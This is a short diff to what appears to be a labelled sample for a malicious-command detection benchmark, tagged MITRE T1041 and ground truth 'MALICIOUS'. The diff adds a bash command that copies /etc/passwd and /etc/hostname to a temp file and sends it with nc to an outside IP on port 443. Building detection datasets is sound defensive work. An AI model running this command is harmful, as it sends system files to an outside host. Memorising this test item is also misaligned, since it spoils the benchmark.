@@ -2,7 +2,7 @@
   "trace": "attack_T1041_exfil.log",
   "ground_truth": "MALICIOUS",
   "technique": "T1041",
-  "command": ,
+  "command": "bash -c 'cat /etc/passwd /etc/hostname > /tmp/data.txt; nc -w1 34.56.78.90 443 < /tmp/data.txt || true'",
   "label_source": "researcher_at_capture_time",
   "capture_mode": "docker_ubuntu_22.04",
   "label_rationale": "Label assigned from command intent before LLM classification"
